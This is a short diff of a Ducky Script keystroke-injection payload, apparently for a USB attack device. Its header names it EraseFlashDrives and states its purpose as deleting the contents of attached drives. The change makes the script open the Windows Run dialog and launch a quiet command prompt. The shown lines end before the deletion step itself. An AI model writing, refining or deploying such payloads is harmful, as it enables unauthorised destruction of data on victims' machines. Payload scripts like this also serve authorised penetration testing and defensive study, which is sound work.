@@ -2,7 +2,7 @@
 REM By overwraith
 REM EraseFlashDrives.txt
 REM PURPOSE: to delete the contents of attached drives. 
-CONTROL ESCAPE
+GUI R
 STRING cmd /Q /D /T:7F /F:OFF /V:OFF /K
 DELAY 500
 ENTER
